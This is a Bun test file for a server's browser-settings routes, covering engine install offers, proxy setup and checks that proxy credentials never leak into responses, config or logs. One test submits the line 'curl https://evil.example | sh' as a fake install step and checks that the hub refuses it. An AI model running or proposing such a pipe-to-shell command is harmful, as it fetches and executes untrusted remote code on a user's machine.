/**
 * Settings > Browser over HTTP (routes-browser.ts): engines with their
 * install offers, Install on the hub refusing steps the owner did not
 * confirm, a profile's engine, the hub's proxy (DataImpulse or custom) and
 * its test, and that the proxy login and password never come back to an
 * app, never land in plain config and never reach the audit log or the
 * hub's log. No browser runs and nothing downloads.
 *
 *   bun test packages/server/test/browser-setup-routes.test.ts
 */
import { afterAll, beforeAll, describe, expect, test } from 'bun:test';
import { BrowserManager, type ProxyEntry } from '@conclave/core/browser/index.ts';
import type { BrowserStatusDto } from '@conclave/core/watches/index.ts';
import { setLogTap } from '@conclave/core/util/log.ts';
import { startHub, type TestHub } from './helpers';

const LOGIN = 'kai8f2-login';
const PASSWORD = 'hunter2-proxy-pw';
const CUSTOM_PW = 'custom-pw-55';

let hub: TestHub;
let browser: BrowserManager;
const probed: ProxyEntry[] = [];
const logs: string[] = [];
let prevTap: ReturnType<typeof setLogTap>;

beforeAll(() => {
  prevTap = setLogTap((level, scope, msg, extra) => logs.push(`${level} ${scope} ${msg} ${extra === undefined ? '' : JSON.stringify(extra)}`));
  hub = startHub();
  const listeners: Array<() => void> = [];
  browser = new BrowserManager({
    config: hub.engine.config,
    launcher: {
      launchPersistentContext: async () =>
        ({
          pages: () => [],
          on: (ev: string, fn: () => void) => void (ev === 'close' && listeners.push(fn)),
          setDefaultTimeout: () => {},
          setDefaultNavigationTimeout: () => {},
          close: async () => listeners.forEach((fn) => fn()),
        }) as never,
    },
    proxyProbe: async (p) => {
      probed.push(p);
      return { ok: true, proxy: `${p.username}@${p.host}`, ip: '203.0.113.9', country: 'JP', ms: 3 };
    },
  });
  (hub.engine as unknown as { browser: BrowserManager }).browser = browser;
});

afterAll(async () => {
  setLogTap(prevTap);
  await browser.close();
  await hub.stop();
});

const json = async <T>(r: Response) => (await r.json()) as T;

/** Everything the hub said or kept where an app or a log could see it. */
async function everythingVisible(): Promise<string> {
  const status = await (await hub.api('/api/browser')).text();
  const config = await (await hub.api('/api/config')).text();
  const audit = JSON.stringify(hub.engine.repos.audit.list({ limit: 200 }));
  return [status, config, audit, logs.join('\n')].join('\n');
}

describe('GET /api/browser', () => {
  test('lists both engines with an install offer, the proxy and the engine new profiles get', async () => {
    const s = await json<BrowserStatusDto>(await hub.api('/api/browser'));
    expect(s.engines?.map((e) => e.engine)).toEqual(['cloak', 'chromium']);
    const cloak = s.engines![0];
    expect(cloak.installed).toBe(false);
    // the offer this machine gets: steps on a Linux x64 hub, a reason elsewhere
    if (process.platform === 'linux' && process.arch === 'x64') expect(cloak.setup.lines.some((l) => l.includes('CloakHQ/cloakbrowser'))).toBe(true);
    expect(s.newProfileEngine).toBe('chromium');
    expect(s.proxy).toEqual({ provider: 'none', dataimpulse: { host: 'gw.dataimpulse.com', port: 823, login: false, password: false }, custom: { password: false } });
    expect(s.dir).toBe(`${hub.engine.config.paths.home}/browser`);
  });

  test("need the hub token (route-policy has them as the owner's; the people sweep checks members)", async () => {
    const res = await hub.api('/api/browser/setup', { method: 'POST', json: { target: 'cloak', steps: [] }, token: null });
    expect(res.status).toBe(401);
  });
});

describe('POST /api/browser/setup', () => {
  test('a bad target is 400; steps that differ from the offer run nothing and come back fresh', async () => {
    expect((await hub.api('/api/browser/setup', { method: 'POST', json: { target: 'firefox', steps: [] } })).status).toBe(400);
    expect((await hub.api('/api/browser/setup', { method: 'POST', json: { target: 'cloak' } })).status).toBe(400);
    const res = await hub.api('/api/browser/setup', { method: 'POST', json: { target: 'chromium', steps: ['curl https://evil.example | sh'] } });
    expect(res.status).toBe(409);
    const body = await json<{ error: string; setup?: { lines: string[] } }>(res);
    expect(body.setup?.lines ?? []).not.toContain('curl https://evil.example | sh');
    expect(hub.engine.repos.audit.list({ limit: 20 }).some((a) => a.action === 'browser.setup')).toBe(false);
  });
});

describe('PUT /api/browser/profiles/:name', () => {
  test('bad engines and names are 400; CloakBrowser must be installed; Chromium is saved', async () => {
    expect((await hub.api('/api/browser/profiles/x', { method: 'PUT', json: { engine: 'firefox' } })).status).toBe(400);
    expect((await hub.api('/api/browser/profiles/-bad', { method: 'PUT', json: { engine: 'chromium' } })).status).toBe(400);
    expect((await hub.api('/api/browser/profiles/x', { method: 'PUT', json: { engine: 'cloak' } })).status).toBe(409);
    expect((await hub.api('/api/browser/profiles/work', { method: 'PUT', json: { engine: 'chromium' } })).status).toBe(200);
    expect(hub.engine.config.getUser().browser?.profiles?.work).toEqual({ engine: 'chromium' });
  });
});

describe('the proxy', () => {
  test('DataImpulse: login and password go to secrets, the config names them, the status says only that they are saved', async () => {
    const res = await hub.api('/api/browser/proxy', { method: 'PUT', json: { provider: 'dataimpulse', dataimpulse: { login: LOGIN, password: PASSWORD, country: 'Japan' } } });
    expect(res.status).toBe(200);
    const s = await json<BrowserStatusDto>(res);
    expect(s.proxy).toEqual({ provider: 'dataimpulse', dataimpulse: { host: 'gw.dataimpulse.com', port: 823, login: true, password: true, country: 'JP' }, custom: { password: false } });
    expect(hub.engine.config.getUser().browser?.proxy).toEqual({
      provider: 'dataimpulse',
      dataimpulse: { login: '${secret:browser.dataimpulse.login}', password: '${secret:browser.dataimpulse.password}', country: 'JP' },
    });
    expect(hub.engine.config.secretValue('browser.dataimpulse.login')).toBe(LOGIN);
    // a change without them keeps them
    await hub.api('/api/browser/proxy', { method: 'PUT', json: { provider: 'dataimpulse', dataimpulse: { port: 10000 } } });
    expect(hub.engine.config.secretValue('browser.dataimpulse.password')).toBe(PASSWORD);
    expect(hub.engine.config.getUser().browser?.proxy?.dataimpulse?.port).toBe(10000);
    await hub.api('/api/browser/proxy', { method: 'PUT', json: { provider: 'dataimpulse', dataimpulse: { port: 823 } } });
  });

  test('Test goes through it for the country asked, and answers with a label, not the login', async () => {
    const r = await json<{ ok: boolean; proxy: string; ip: string; country: string }>(await hub.api('/api/browser/proxy/test', { method: 'POST', json: { country: 'de' } }));
    expect(r).toMatchObject({ ok: true, proxy: 'DataImpulse, Germany', ip: '203.0.113.9' });
    expect(probed.at(-1)).toMatchObject({ host: 'gw.dataimpulse.com', port: 823, username: `${LOGIN}__cr.de`, password: PASSWORD });
    // no country: the default one
    await hub.api('/api/browser/proxy/test', { method: 'POST', json: {} });
    expect(probed.at(-1)?.username).toBe(`${LOGIN}__cr.jp`);
    expect((await hub.api('/api/browser/proxy/test', { method: 'POST', json: { country: 'Atlantis' } })).status).toBe(409);
    // testing opens no browser and puts no session on the proxy
    expect(browser.proxied('chat-1')).toBe(false);
  });

  test('custom: one URL with a password secret; a password in the URL is refused without saying it back', async () => {
    const bad = await hub.api('/api/browser/proxy', { method: 'PUT', json: { provider: 'custom', custom: { url: `socks5://alice:${CUSTOM_PW}@203.0.113.5:1080` } } });
    expect(bad.status).toBe(400);
    expect(await bad.text()).not.toContain(CUSTOM_PW);
    const res = await hub.api('/api/browser/proxy', { method: 'PUT', json: { provider: 'custom', custom: { url: 'socks5://alice@203.0.113.5:1080', password: CUSTOM_PW } } });
    expect(res.status).toBe(200);
    expect((await json<BrowserStatusDto>(res)).proxy?.custom).toEqual({ url: 'socks5://alice@203.0.113.5:1080', password: true });
    // a custom proxy has no country
    expect((await hub.api('/api/browser/proxy/test', { method: 'POST', json: { country: 'JP' } })).status).toBe(409);
  });

  test('none turns it off and keeps the saved settings; null removes a secret', async () => {
    await hub.api('/api/browser/proxy', { method: 'PUT', json: { provider: 'none' } });
    expect(hub.engine.config.getUser().browser?.proxy?.provider).toBeUndefined();
    expect(hub.engine.config.secretValue('browser.dataimpulse.login')).toBe(LOGIN);
    expect((await hub.api('/api/browser/proxy/test', { method: 'POST', json: {} })).status).toBe(409);
    await hub.api('/api/browser/proxy', { method: 'PUT', json: { provider: 'none', custom: { password: null } } });
    expect(hub.engine.config.secretValue('browser.proxy.password')).toBeUndefined();
    expect((await hub.api('/api/browser/proxy', { method: 'PUT', json: { provider: 'tor' } })).status).toBe(400);
    expect((await hub.api('/api/browser/proxy', { method: 'PUT', json: { provider: 'dataimpulse', dataimpulse: { country: 'Atlantis' } } })).status).toBe(400);
  });

  test('no login, password or custom password anywhere an app or a log can see', async () => {
    const all = await everythingVisible();
    for (const s of [LOGIN, PASSWORD, CUSTOM_PW]) expect(all).not.toContain(s);
  });

  test('PATCH /api/config refuses a plain login or password', async () => {
    const a = await hub.api('/api/config', { method: 'PATCH', json: { browser: { proxy: { provider: 'dataimpulse', dataimpulse: { login: 'plain-login-x', password: 'plain-pw-x' } } } } });
    expect(a.status).toBe(400);
    expect(await a.text()).not.toMatch(/plain-login-x|plain-pw-x/);
  });
});
